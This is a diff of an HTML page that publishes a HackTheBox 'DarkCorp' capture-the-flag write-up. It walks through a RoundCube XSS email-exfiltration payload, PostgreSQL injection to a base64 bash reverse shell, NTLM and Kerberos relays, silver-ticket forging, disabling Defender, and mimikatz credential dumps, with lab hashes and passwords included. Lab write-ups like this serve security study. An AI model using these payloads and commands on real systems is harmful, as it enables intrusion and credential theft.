@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>DarkCorp - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/DarkCorp.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for DarkCorp machine from HackTheBox - Insane difficulty level">
+    <meta name="description" content="Detailed writeup for DarkCorp machine from HackTheBox - Insane difficulty level">
     <meta name="keywords" content="HackTheBox, DarkCorp, Insane, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,433 @@
         <h1 class="writeup-title">DarkCorp</h1>
         <div class="writeup-metadata">
             <span class="difficulty insane">Insane</span>
-            <span class="date">Active machine</span>
+            <span class="date">October 18, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="DarkCorp" src="../images/DarkCorp/pwned.png" /></p>
-<p>DarkCorp is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once DarkCorp retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/DarkCorp/pwned.png" /></p>
+<p>DarkCorp was an insane-difficulty multi-machine Active Directory environment that began with exploiting CVE-2024-42009, a stored XSS vulnerability in RoundCube 1.6.7.
+I created a JavaScript payload to exfiltrate emails from the security engineer <code>bcase</code> through the contact form, which revealed a password reset token granting me access to an internal dashboard.</p>
+<p>The dashboard contained a search function vulnerable to PostgreSQL SQL injection with superuser privileges. I exploited this by manipulating the Write-Ahead-Logging configuration through lo_import/lo_export functions, injecting a malicious archive_command into postgresql.conf that executed a base64-encoded reverse shell, gaining access as the postgres user.
+I discovered an encrypted database backup in <code>/var/backups/postgres</code>, which I decrypted using credentials from the Flask app's .env file, revealing MD5 hashes for ebelford and victor.r.
+SSH access as ebelford provided a foothold on the Linux machine at 172.16.20.3.</p>
+<p>Network enumeration through a Ligolo tunnel revealed an internal subnet with DC-01 at 172.16.20.1 and WEB-01 at 172.16.20.2. I exploited disabled LDAP signing on the DC by configuring an NTLM relay that captured svc_acc's authentication, discovering this account was a member of DnsAdmins.
+I pivoted to a Kerberos relay attack by adding a specially crafted DNS record (DC-011UWhRCAAAA...) that forced Kerberos authentication while maintaining DC connectivity, then used krbrelayx.py to relay the authentication to the ADCS endpoint at https://dc-01.darkcorp.htb/certsrv/, requesting a Machine certificate for WEB-01.
+I authenticated with this certificate using certipy−ad to obtain WEB−01's NT hash (8f33c7fc7ff515c1f358e488fbb8b675).</p>
+<p>Using the domain SID and WEB-01$'s hash, I forged a silver ticket for Administrator access to WEB-01 with impacket-ticketer, then dumped SAM hashes using netexec to retrieve the local Administrator hash (88d84ec08dad123eb04a060a74053f21).
+After gaining WinRM access, I used netexec's --dpapi flag to remotely extract DPAPI masterkeys, revealing Administrator's password "But_Lying_Aid9!".
+I decrypted additional masterkeys and a credential blob with impacket-dpapi, uncovering the password "Pack_Beneath_Solid9!" which I sprayed against the domain to discover john.w's credentials.</p>
+<p>BloodHound enumeration revealed john.w had GenericWrite over angela.w, which I exploited using certipy-ad's shadow credentials attack to obtain angela.w's NT hash.
+I then performed UPN spoofing by using bloodyAD to set angela.w's userPrincipalName to "angela.w.adm", exploiting the authentication difference between Windows SSPI/PAC validation and Unix GSSAPI/UPN validation.
+I requested an NT_ENTERPRISE ticket with impacket-getTGT and transferred the ccache file to the Linux machine, using ksu to authenticate as angela.w.adm.</p>
+<p>Enumeration of SSSD files in <code>/var/lib/sss/db</code> revealed a cached SHA512 hash which cracked to "!QAZzaq1", belonging to taylor.b.adm who was a member of the gpo_managers group.
+Taylor had FullControl over the "SecurityUpdates" GPO (GUID 652CAE9A-4BB7-49F2-9E52-3361F33CE786), which I exploited remotely using pyGPOAbuse to create a local administrator account named john with credentials "john:H4x00r123..", achieving full domain compromise via WinRM to DC-01</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/DarkCorp/nmap.png" /></p>
+<p>Initial nmap scan reveals just 2 ports, SSH and a website on 80. The results point towards a Linux host, but DarkCorp was listed as a Windows machine, which means that it is most likely a multi-machine scenario.</p>
+<h2>Investigating the website</h2>
+<p><a href="we.png">{we</a></p>
+<p>I will add <code>drip.htb</code> to my hostfile, under the DarkCorp IP.</p>
+<p><img alt="webste" src="../images/DarkCorp/webste.png" /></p>
+<p>This is a website for an Email client of some sort. I can see that it is using RoundCube under its hood, which is good to remember for the future.</p>
+<p>The sign-in button points towards <code>mail.drip.htb</code>, which will also be added to my hostfile.</p>
+<p><img alt="client" src="../images/DarkCorp/client.png" /></p>
+<p>It leads to a RoundCude login page, but I have no credentials. I will check the page's source code, as it might reveal RoundCube's version number.</p>
+<p><img alt="source" src="../images/DarkCorp/source.png" /></p>
+<p>Taking a closer look at <code>rcmail.set_env</code>, it reveals a ton of information, including the <code>rcversion":10607</code> value, which discloses the RoundCube version as 1.6.7.</p>
+<p>Searching the web has quickly led me to <code>CVE-2024-42009</code>, a stored XSS vulnerability in RoundCube versions through 1.5.7 and 1.6.x through 1.6.7 via a desanitization issue in message_body(), which fits with the DarkCorp instance. I also found a PoC on GitHub for this CVE: <code>https://github.com/0xbassiouny1337/CVE-2024-42009</code></p>
+<p>This is explained much better in the article below.</p>
+<p><code>https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/</code></p>
+<h2>Preparing the exploit</h2>
+<p>I created an account of <code>test:test@dripmail.htb</code> on the website, and got my own RoundCube mailbox. After looking around, I made a crucial discovery:</p>
+<p><code>http://mail.drip.htb/?_task=mail&amp;_caps=pdf%3D1%2Cflash%3D0%2Ctiff%3D0%2Cwebp%3D1%2Cpgpmime%3D0&amp;_uid=1&amp;_mbox=INBOX&amp;_action=show</code></p>
+<p>This is the URL of an opened Email. Take a look at the UID variable. If I had more than 1 email, I could switch between them by incrementing this number.</p>
+<p>It is crucial because it will allow me to cycle through the target's Emails and exfiltrate all of them. I just need a reliable script and a payload that will do the hard work for me.</p>
+<h3>Creating an XSS payload</h3>
+<p>I began working on the payload first, as I could test it quickly by targeting my own mailbox(via devtools).</p>
+<pre class="codehilite"><code>for (let i = 1; i &lt;= 5; i++) {
+    fetch(`/?_task=mail&amp;_action=show&amp;_uid=${i}&amp;_mbox=INBOX&amp;_extwin=1`)
+        .then(response =&gt; response.text())
+        .then(email_html =&gt; {
+            console.log(`--- SUCCESSFULLY FETCHED EMAIL UID: ${i} ---`);
+            console.log(email_html.substring(0, 500));
+        })
+        .catch(error =&gt; {
+            console.error(`--- FAILED TO FETCH EMAIL UID: ${i} ---`, error);
+        });
+}
+</code></pre>
+
+<p>This errored out because of a missing CSRF token. I can grab one dynamically from the page itself by adding a single line, as it is saved in the RoundCube environment.</p>
+<p><code>const csrfToken = rcmail.env.request_token;</code></p>
+<p><img alt="fetch" src="../images/DarkCorp/fetch.png" /></p>
+<p>This worked somewhat, but it did not return the message. That is because the Email contents are stored in a div with an ID of <code>messagebody</code></p>
+<p><img alt="messagebody" src="../images/DarkCorp/messagebody.png" /></p>
+<p>I modified the script to look for a div with an ID of messagebody. Now it should correctly cycle through the set amount of UIDs and grab the message contents.</p>
+<pre class="codehilite"><code>const csrfToken = rcmail.env.request_token;
+console.log(&quot;Using CSRF Token:&quot;, csrfToken);
+
+for (let i = 1; i &lt;= 5; i++) {
+    const url = `/?_task=mail&amp;_action=show&amp;_uid=${i}&amp;_mbox=INBOX&amp;_extwin=1&amp;_token=${csrfToken}`;
+
+    fetch(url)
+        .then(response =&gt; response.text())
+        .then(email_html_string =&gt; {
+            const parser = new DOMParser();
+            const emailDoc = parser.parseFromString(email_html_string, &quot;text/html&quot;);
+
+            const messageBody = emailDoc.getElementById('messagebody');
+
+            if (messageBody) {
+                console.log(`{!} SUCCESS! Found Email Body for UID: ${i}`);
+                console.log(messageBody.innerHTML);
+            } else {
+                console.error(`{X} FAILED for UID: ${i}. Fetched the page, but couldn't find a #messagebody div. The email might not exist or is empty.`);
+            }
+        })
+        .catch(error =&gt; {
+            console.error(`{X} ERROR FOR UID: ${i}`, error);
+        });
+}
+</code></pre>
+
+<p><img alt="exfil" src="../images/DarkCorp/exfil.png" /></p>
+<h3>Wrapping the JS payload in a reliable script</h3>
+<p>I crafted a robust python script that would send a malicious message through the contact form. This is because I can manipulate the request to change the intended receiver.</p>
+<p>However, I did not get any hits with my current JS payload. While I received a message on my RoundCube inbox, I only saw a broken attachment, which was not what I expected.</p>
+<p>This made me change my plans, and I moved the loop logic to the python script. Now, the JS payload will simply fetch whole pages, and as many as there are UIDs specified.</p>
+<p>I've also added a listener, which will catch and decode(from b64) any exfiltrated emails.</p>
+<p><img alt="mails" src="../images/DarkCorp/mails.png" /></p>
+<p>5 E-mails, each targeting a different UID, were sent to my inbox, and after opening one of them:</p>
+<p><img alt="mail" src="../images/DarkCorp/mail.png" /></p>
+<p>The contents have been successfully exfiltrated.</p>
+<h2>Finding a target user</h2>
+<p>A working exploit will not give me anything without a viable target user. I returned to the contact form and changed the receiver from support to my test account, just to see whether this would reveal any information.</p>
+<p><img alt="newuser" src="../images/DarkCorp/newuser.png" /></p>
+<p>It revealed an email of the security engineer, <code>bcase@drip.htb</code>. This seems like a prime target for the exploit, so I adjusted the exploit script to target bcase.</p>
+<p><img alt="dashboard" src="../images/DarkCorp/dashboard.png" /></p>
+<p>Bcase opened the XSS messages after a few seconds, and a dashboard was revealed. I will add it to my hostfile before proceeding.</p>
+<h2>Resetting bcase's password on the dashboard</h2>
+<p><img alt="reset" src="../images/DarkCorp/reset.png" /></p>
+<p>Since I can exfiltrate bcase's Email messages, I should be able to reset their password and log in to this dashboard.</p>
+<p><img alt="token" src="../images/DarkCorp/token.png" /></p>
+<p>I requested a reset token, which landed in bcase's Email. Then I reran the exploit script, hoping to see a password reset link.</p>
+<p><img alt="email1" src="../images/DarkCorp/email1.png" /></p>
+<p>Success! I quickly opened the link in my browser, set bcase's password to <code>test</code>, and finally logged into the dashboard.</p>
+<p><img alt="dashboard1" src="../images/DarkCorp/dashboard1.png" /></p>
+<h2>SQL injection in the search functionality</h2>
+<p>Right after getting onto the dashboard, I immediately noticed a search bar. Inputting a random string of text like "test" reveals an interesting error message.</p>
+<p><img alt="error" src="../images/DarkCorp/error.png" /></p>
+<p>Psycopg2 is a PostgreSQL database adapter for python. Notice how in the error message, my input is not enclosed with quotes at all. Let's see what will happen if I input <code>'test'</code> into the search bar.</p>
+<p><img alt="noerror" src="../images/DarkCorp/noerror.png" /></p>
+<p>There was no error this time. I'll add an additional statement to the query in order to see whether the injection is successful.</p>
+<p><code>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md</code></p>
+<p><img alt="injection" src="../images/DarkCorp/injection.png" /></p>
+<h3>Reading local files via Postgres SQLi</h3>
+<p>I ran another query to see which users had the DB Administrator rights. If dripmail_dba is on the list, it'll allow me to perform most of the actions.</p>
+<p><code>'test';SELECT usename FROM pg_user WHERE usesuper IS TRUE</code></p>
+<p><img alt="supseruser" src="../images/DarkCorp/superuser.png" /></p>
+<p>This confirms that my user has superuser privileges over this DB. I will run a few more commands to gather more information about the underlying environment.</p>
+<p><code>https://hackviser.com/tactics/pentesting/services/postgresql</code></p>
+<p><code>'test';SELECT name, setting FROM pg_settings WHERE name LIKE 'log%';</code></p>
+<p>Logs often contain sensitive data, hence why I'll enumerate any available log files first.</p>
+<p><img alt="log" src="../images/DarkCorp/log.png" /></p>
+<p>The logfiles are located in the <code>log</code> directory. I understood this as the <code>/var/log</code> directory, which would also have an additional directory for PostgreSQL itself.</p>
+<p><code>'test';select pg_ls_dir('/var/log/postgresql');</code></p>
+<p><img alt="logfiles" src="../images/DarkCorp/logfiles.png" /></p>
+<p>There are 2 "unpacked" logfiles. I will read both of them, starting with <code>postgresql-15-main.log</code></p>
+<p><img alt="nothing" src="../images/DarkCorp/nothing.png" /></p>
+<p>The logfiles did not contain anything useful. Superuser privileges allow me to do a lot of things on the DB, so I'll pivot to something else.</p>
+<h2>Postgresql RCE via config file manipulation(Write-Ahead-Logging)</h2>
+<p>While researching potential RCE methods, I stumbled upon an article that explains an interesting method used in a similar scenario.</p>
+<p><code>https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3</code></p>
+<p>The article explains it very well, but in short, it is an RCE method achievable by PostgreSQL config file poisoning with an arbitrary <code>archive_command</code></p>
+<p>I'll follow the steps outlined in the article above. First, making sure that WAL archiving is enabled.</p>
+<p><code>'test';SELECT current_setting('archive_command')</code></p>
+<p><img alt="arhiveon" src="../images/DarkCorp/archiveon.png" /></p>
+<p>Then, I'll exfiltrate the original postgres.conf file. I'll get its loid(large object ID).</p>
+<p><code>'test';SELECT lo_import('/etc/postgresql/15/main/postgresql.conf')</code></p>
+<p><img alt="loid" src="../images/DarkCorp/loid.png" /></p>
+<p>Now I will use this ID to actually export the config. This will display it back and allow me to copy it to my local machine.</p>
+<p><code>'test';SELECT encode(lo_get(105117), 'escape')</code></p>
+<p><img alt="conf" src="../images/DarkCorp/conf.png" /></p>
+<h3>Overwriting the config</h3>
+<p><img alt="archive" src="../images/DarkCorp/archive.png" /></p>
+<p>The target option is empty. I'll add a base64 encoded reverse shell between the single quotes.</p>
+<p><code>echo "IGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuODIvOTAwMSAwPiYxCg==" | base64 -d | bash</code></p>
+<p>While in the article, a perl reverse shell was used, I'll go forward with my bash command. If it fails to work, I will switch to perl.</p>
+<p>And this is when I stumbled upon the first big issue. Uploading a very, very big b64 string would lead me to a 502 bad gateway error, so this was out of the question.</p>
+<p>Instead, I've decided on a different approach. I will create a minimal config consisting of 2 lines:</p>
+<pre class="codehilite"><code>archive_mode = on
+archive_command = 'echo &quot;IGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuODIvOTAwMSAwPiYxCg==&quot; | base64 -d | bash'
+</code></pre>
+
+<p>Then I will add an <code>include</code> option to the original config file, which will point to this minimal one. Since it will be lower in the config itself, it should take precedence over the earlier option.</p>
+<p><code>'test';SELECT lo_from_bytea(9999, decode('&lt;BASE64&gt;', 'base64'))</code></p>
+<p>This command loads the decoded b64 config into the large object 9999.</p>
+<p><code>'test';SELECT lo_export(9999, '/tmp/mini.conf')</code></p>
+<p>And this exports the decoded contents to a file on the target filesystem.</p>
+<p><img alt="mini" src="../images/DarkCorp/mini.png" /></p>
+<p><code>'test';SELECT lo_export(105117, '/tmp/postgres.conf')</code></p>
+<p>I've also copied the original config into a different file, so that it doesn't get accidentally destroyed by my experiments.</p>
+<p>Now I will get the LOID of the new config file.</p>
+<p><code>'test';SELECT lo_import('/tmp/postgres.conf')</code></p>
+<p><img alt="newloid" src="../images/DarkCorp/newloid.png" /></p>
+<p>With all this, I'll use <code>lo_put</code> to append the include option at the end of my config file. It would be very risky to overwrite the original archive command option, as even if a single character is overwritten where it should not be, the config file will be rejected and the plan will fail.</p>
+<p>To do so, I will grab the total length of my copied config file.</p>
+<p><code>'test'; SELECT length(lo_get(112138));</code></p>
+<p>The result is <code>39682</code>. Lo_put requires 3 values. The LOID, the offset at which the edit will happen, and the data. If I specify the offset at the file's end, data will be appended right at the end.</p>
+<p><code>'test'; SELECT lo_put(112138, 39682, convert_to(E'\n# Custom includes by kalin\ninclude = \'/tmp/mini.conf\'\n', 'UTF8'))</code></p>
+<p>Let's take a look at the ending of this file after exporting it.</p>
+<p><code>'test'; SELECT pg_read_file ('/tmp/postgres.conf')</code></p>
+<p><img alt="append" src="../images/DarkCorp/append.png" /></p>
+<p>Success! Now I'll overwrite the real config with my malicious one(always make a backup beforehand!)</p>
+<p><code>'test';SELECT lo_export(112138, '/etc/postgresql/15/main/postgresql.conf')</code></p>
+<p>However, this did not trigger a response either.</p>
+<h3>Appending malicious code to the main config file</h3>
+<p>After all the failed attempts, I decided to go back to the beginning. The plan of uploading the entire base64-encoded config file failed because it was too big, and I was blocked by a 502 bad gateway error.</p>
+<p>I decided to experiment a little and removed every line that starts with a comment #, and every line that starts with a space.</p>
+<p>This will leave every used option in, but will significantly shorten the resulting base64, which could allow me to send it through.</p>
+<p><code>grep -vE '^#|^$|^ ' postgres.conf &gt; postgresql.min.conf</code></p>
+<p><img alt="shorter" src="../images/DarkCorp/shorter.png" /></p>
+<p>This is significantly shorter! It will most likely succeed with uploading now.</p>
+<p><code>'test';SELECT lo_from_bytea(9001, decode('&lt;BASE64&gt;', 'base64'))</code></p>
+<p>It worked, and I immediately exported it to /tmp/postgres.conf.</p>
+<p><img alt="export" src="../images/DarkCorp/export.png" /></p>
+<p>Then, I exported it into the original .conf file.</p>
+<p>And this time, even though the <code>'test';SELECT current_setting('archive_command')</code> command output was blank.</p>
+<p><img alt="shell" src="../images/DarkCorp/shell.png" /></p>
+<p>There was a successful hit on my listener, and a shell was established.</p>
+<h2>Reconnaissance on the Linux machine</h2>
+<p>While looking around, I discovered a directory <code>/var/backups/postgres</code>, which held an encrypted .sql file.</p>
+<p><img alt="backup" src="../images/DarkCorp/backup.png" /></p>
+<p>Since I have a shell as the database user, I should be able to decrypt it.</p>
+<h3>Decrypting the database backup</h3>
+<p><a href="fail.png">{fail</a></p>
+<p>It throws a <code>missing secret key</code> error. While this sounds scary, it doesn't necessarily mean a missing GPG key. The main use of the postgres database I've seen on the website was on the dashboard, so I'll take a look at its files under <code>/var/www/html/dashboard</code></p>
+<p><img alt="config" src="../images/DarkCorp/config.py" /></p>
+<p>I can see that it takes values from an .env file. One of these values is the DB_PASSWORD variable, which could be the key to unlocking the .sql file.</p>
+<p><img alt="environment" src="../images/DarkCorp/environment.png" /></p>
+<p>And there's the password, found inside of this Flask app environment. Let's see if this will allow me to decrypt the backup.</p>
+<p>After a bit of research, I learned that I can pass the passphrase directly into the terminal if the --pinentry-mode flag is set to loopback.</p>
+<p><code>gpg --homedir /var/lib/postgresql/.gnupg --pinentry-mode=loopback --passphrase '2Qa2SsBkQvsc' --decrypt /var/backups/postgres/dev-dripmail.old.sql.gpg &gt; dev-dripmail.old.sql</code></p>
+<p><img alt="database" src="../images/DarkCorp/database.png" /></p>
+<p>Successfully decrypted! Now I'll transfer this file onto my box so that I can look through it easily.</p>
+<p><code>cat dev-dripmail.old.sql | grep pass -C 5</code></p>
+<p><img alt="hashes" src="../images/DarkCorp/hashes.png" /></p>
+<p>There are 6 different hashes in total. They look like MD5 hashes, so I'll use crackstation to check if they're crackable.</p>
+<p><img alt="crack" src="../images/DarkCorp/crack.png" /></p>
+<pre class="codehilite"><code>ebelford | ThePlague61780
+victor.r | victor1gustavo@#
+</code></pre>
+
+<p>Hashes for ebelford and victor.r cracked. I'll try to SSH into the Linux box, as it might be a nice checkpoint to continue from.</p>
+<p><img alt="ssh" src="../images/DarkCorp/ssh.png" /></p>
+<h3>Setting up a Ligolo tunnel</h3>
+<p>With this safe point now in hand, I continued to enumerate the Linux box. Soon after, I found a local subnet to enumerate.</p>
+<p><img alt="subnet" src="../images/DarkCorp/subnet.png" /></p>
+<p>I will create a tunnel between the Linux box and my host with Ligolo.</p>
+<pre class="codehilite"><code>sudo ip tuntap add user kalin mode tun ligolo
+
+sudo ip link set ligolo up
+
+sudo ip route add 172.16.20.0/24 dev ligolo
+</code></pre>
+
+<p><img alt="tunnel" src="../images/DarkCorp/tunnel.png" /></p>
+<p>To enumerate the subnet quickly, I'll use a ping command in a loop to ping the first 10 IPs of the subnet. Remembering that the Linux box itself has the IP address of 172.16.20.3.</p>
+<p><code>for i in $(seq 1 10); do ping -c 1 172.16.20.$i; done</code></p>
+<p><img alt="scan" src="../images/DarkCorp/scan.png" /></p>
+<p>Aside from the Linux box, there are machines at 172.16.20.1 and 172.16.20.2. Scanning each of them with nmap is the next step.</p>
+<p><img alt="dc01" src="../images/DarkCorp/dc01.png" /></p>
+<p>172.16.20.1 is the domain controller.</p>
+<p><img alt="web-01" src="../images/DarkCorp/web-01.png" /></p>
+<p>And 172.16.20.2 is WEB-01, which has an interesting entry at port 5000, requiring credentials to access.</p>
+<p><code>|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.</code></p>
+<h2>NTLM Relay against WEB-01</h2>
+<p><img alt="login" src="../images/DarkCorp/login.png" /></p>
+<p>As shown by nmap, this website requires credentials. I'll try the ones I've gotten from the database.</p>
+<p><img alt="monitor" src="../images/DarkCorp/monitor.png" /></p>
+<p>Credentials for victor.r unlock the website, and a status monitor application is revealed. It seems to be reaching out to WEB-01 periodically every few minutes.</p>
+<h3>Preparing the relay attack</h3>
+<p><img alt="computers" src="../images/DarkCorp/computers.png" /></p>
+<p>SMB Signing on WEB-01 is disabled. It is a protective measure that ensures signing for every SMB message, which effectively negates any sorts of tampering, like relay attacks over SMN. A similar situation occurs on the DC itself, but with LDAP signing. This means that regular NTLM Relay attacks are viable, and as soon as someone authenticates to the Linux box, I'd be able to relay back that authentication back to the DC.</p>
+<p>To set the plan in motion, I'll need a few extra steps. The Linux box does not have python, so I can't just transfer ntlmrelayx there. Instead, I'll forward one of the ports back to my host using Ligolo.</p>
+<p><code>listener_add --addr 172.16.20.3:8080 --to 127.0.0.1:80 --tcp</code></p>
+<p>I'm using 8080 here, because from the nmap results, I know for sure that it is an unused port. Lower port numbers (&lt;1000) also require root permission to use on Linux, which eliminates port 443 from use.</p>
+<p><code>impacket-ntlmrelayx -t ldap://172.16.20.1 -i -smb2support</code></p>
+<p><img alt="relay" src="../images/DarkCorp/relay.png" /></p>
+<p>An authentication attempt from svc_acc was successfully relayed to DC01!. Now that I know which user's auth I can relay, I'll get more information about the account.</p>
+<p><img alt="groups" src="../images/DarkCorp/groups.png" /></p>
+<p>Checking the groups gives me a lot of information, but most importantly for now, the svc_acc account is a member of the DnsAdmins group. This group can modify and add DNS records on the domain, which could allow me to exploit a different relay attack.</p>
+<h2>Kerberos Relay against WEB-01</h2>
+<p><img alt="fail1" src="../images/DarkCorp/fail1.png" /></p>
+<p>I cannot add rights over svc_acc to other controlled accounts, nor can I add a computer account. The computer account addition was a crucial step in a different scenario involving Kerberos relay that I did recently. Without it, I will have to figure out a different way.</p>
+<p>The attempted takeover or svc_acc was supposed to make operating with it easier, but I can still perform certain tasks using its relayed credentials.</p>
+<p><code>impacket-ntlmrelayx -t ldap://172.16.20.2 -smb2support --add-dns-record 'hexicon' '10.10.16.82'</code></p>
+<p><img alt="dns" src="../images/DarkCorp/dns.png" /></p>
+<p>This allows the target machine to reach my box, after coercing the auth with netexec's SMB module <code>coerce_plus</code></p>
+<p><code>nxc smb 172.16.20.2 -u victor.r -p 'victor1gustavo@#' -M coerce_plus -o L=hexicon</code></p>
+<p><img alt="ntlm" src="../images/DarkCorp/ntlm.png" /></p>
+<p>Coercing authentication to <code>hexicon</code> results in an NTLM hash being sent, which is not what I want. There are 2 ways that I know of to force a Kerberos authentication attempt:</p>
+<ol>
+<li>
+<p>Connecting to a rogue computer object - It requires a controllable computer object, for which we can add an SPN, DNS record, and the DnsHostName attribute. Setting this all up allows us to coerce the machine to authenticate to us with Kerberos.</p>
+</li>
+<li>
+<p>This is something I've found on HackTricks. By using a specially crafted DNS record, we can "trick" the machine into authenticating to us, and still keep it able to request a ticket from the DC. This can then be relayed further to fulfill our goals.</p>
+</li>
+</ol>
+<p><code>https://www.thehacker.recipes/ad/movement/kerberos/relay</code></p>
+<h3>Setting up the Kerberos Relay attack</h3>
+<p>First, let's make sure that the certificate enrollment endpoint exists on DC-01. Remembering that DC-01 was in the cert-related group, I am fairly confident that it does.</p>
+<p><code>https://dc-01.darkcorp.htb/certsrv/certfnsh.asp</code></p>
+<p><img alt="certs" src="../images/DarkCorp/certs.png" /></p>
+<p>It exists! Next, I will add all the necessary records to my hostfile.</p>
+<pre class="codehilite"><code>172.16.20.2 WEB-01
+172.16.20.1 dc-01.darkcorp.htb
+</code></pre>
+
+<p>According to the article, the minimal <code>CREDENTIAL_TARGET_INFORMATION</code> structure contains 1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA(marshalized string), and the NetBIOS name(hostname) of the DC should be appended to the front, resulting in the following record:</p>
+<p><code>DC-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA</code></p>
+<p><img alt="record" src="../images/DarkCorp/record.png" /></p>
+<p>While trying to coerce another authentication attempt, using the netexec module became impossible due to a <code>The NETBIOS connection with the remote host timed out.</code> error. I pivoted to using the regular PetitPotam.py script instead.</p>
+<p><code>python PetitPotam/PetitPotam.py -u victor.r -p 'victor1gustavo@#' DC-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA WEB-01</code></p>
+<p><img alt="potam" src="../images/DarkCorp/potam.png" /></p>
+<p>In a different terminal, I launched krbrelayx.py. This time, relaying the credentials to the discovered Cert Enrollment endpoint, and requesting a certificate for the <code>WEB-01$</code> machine account, with the machine template.</p>
+<p><code>python /home/kalin/DarkZero/krbrelayx/krbrelayx.py -t 'https://dc-01.darkcorp.htb/certsrv/certfnsh.asp' --adcs --template Machine -v 'WEB-01$'</code></p>
+<p><img alt="certificate" src="../images/DarkCorp/certificate.png" /></p>
+<p>Certificate successfully received! Now I can use it to authenticate to DC-01 as WEB-01$ and retrieve the latter's NTLM hash.</p>
+<p><code>certipy-ad auth -pfx 'WEB-01$.pfx' -dc-ip 172.16.20.1</code></p>
+<p><img alt="hash" src="../images/DarkCorp/hash.png" /></p>
+<p><code>WEB-01$ | 8f33c7fc7ff515c1f358e488fbb8b675</code></p>
+<h2>Forging a silver ticket for the administrator over WEB-01</h2>
+<p>Trying to use impacket's secretsdump on the WEB-01 machine returns a <code>0x5 - rpc_s_access_denied</code> error. This could mean that the machine account does not have the necessary permissions to perform this action.</p>
+<p>Since I also cannot add machine accounts, I will have to find a different way. Namely, I'll create a silver ticket for the administrator over the WEB-01 machine. For this, I need 2 crucial things:</p>
+<ol>
+<li>
+<p>NT hash of the account/service the ticket will be for(example: CIFS/WEB-01.darkcorp.htb or MSSQL/some.domain.name)</p>
+</li>
+<li>
+<p>The domain SID</p>
+</li>
+</ol>
+<p>To get the domain SID, I can use netexec over LDAP with the --get-sid flag.</p>
+<p><code>nxc ldap 172.16.20.1 -u 'WEB-01$' -H '8f33c7fc7ff515c1f358e488fbb8b675' --get-sid</code></p>
+<p><img alt="sid" src="../images/DarkCorp/sid.png" /></p>
+<p>This is everything I need to forge a silver ticket. The tool for that will be impacket's ticketer.</p>
+<p><code>impacket-ticketer -spn CIFS/WEB-01.darkcorp.htb -domain-sid S-1-5-21-3432610366-2163336488-3604236847 -domain darkcorp.htb -nthash 8f33c7fc7ff515c1f358e488fbb8b675 Administrator</code></p>
+<p>As a result of the above command, an administrator ticket for CIFS(Common Internet File System) will be created for access to WEB-01.</p>
+<p><img alt="ticket" src="../images/DarkCorp/ticket.png" /></p>
+<p>With an administrator ticket in hand, my next move would be to use secretsdump to get the user hashes. However, this operation is blocked for WEB-01.</p>
+<p><img alt="blocked" src="../images/DarkCorp/blocked.png" /></p>
+<p>It is most likely because it's trying to reach the NTDS.DIT file. While an administrator usually doesn't have issues with this file, there may be some special policies in place that block access to this file.</p>
+<p>I can bypass this by targeting the SAM hive instead. Netexec has a flag that allows for remote dumping of SAM(Security Account Manager) hashes.</p>
+<p><img alt="sam" src="../images/DarkCorp/sam.png" /></p>
+<p><code>Administrator | 88d84ec08dad123eb04a060a74053f21</code></p>
+<p>I'll try to remote into WEB-01 as the administrator with his hash.</p>
+<p><code>evil-winrm -i 172.16.20.2 -u Administrator -H 88d84ec08dad123eb04a060a74053f21</code></p>
+<p><img alt="user" src="../images/DarkCorp/user.png" /></p>
+<h1>Root flag</h1>
+<p>The first thing I wanted to do after getting admin access to the box was dumping credentials with mimikatz. I disabled defender preemptively using my administrative rights.</p>
+<pre class="codehilite"><code>Set-MpPreference -DisableRealtimeMonitoring $true - Disables Windows defender
+
+.\mimikatz.exe 'sekurlsa::logonpasswords /patch' exit | Dumps logon credentials from LSASS
+</code></pre>
+
+<p><img alt="mimikatz" src="../images/DarkCorp/mimikatz.png" /></p>
+<p>This uncovered the password of WEB-01$, but it's not useful as I already have its hash.</p>
+<h2>Discovering DPAPI masterkeys</h2>
+<p>In the admin's <code>AppData/Roaming/Microsoft/Protect/SID/</code>, I found 3 masterkey files.</p>
+<p><img alt="masterkey" src="../images/DarkCorp/masterkey.png" /></p>
+<p>And in the <code>AppData/Local/Microsoft/Credentials</code>, I found a single credential blob.</p>
+<p><img alt="credential" src="../images/DarkCorp/credential.png" /></p>
+<p>My usual DPAPI decryption method involved using impacket-dpapi, and locally decrypting the blob. Here, this won't be possible, because this method requires the user's password, which I don't have.</p>
+<p>Since mimikatz is running in the administrator's context, I should be able to use it and decrypt masterkey file.</p>
+<p><code>.\mimikatz.exe 'dpapi::masterkey /in:6037d071-cac5-481e-9e08-c4296c0a7ff7 /sid:S-1-5-21-2988385993-1727309239-2541228647-500 /hash:88d84ec08dad123eb04a060a74053f21 /patch' exit</code></p>
+<p><img alt="fail2" src="../images/DarkCorp/fail2.png" /></p>
+<p>The unprotect operation fails, even though a user hash was supplied. It could be because mimikatz expects a different type of hash(for example, SHA1).</p>
+<p>Netexec comes to the rescue again here. Using its --dpapi flag, I was able to remotely extract the masterkeys, and get some secrets.</p>
+<p><img alt="dpapi" src="../images/DarkCorp/dpapi.png" /></p>
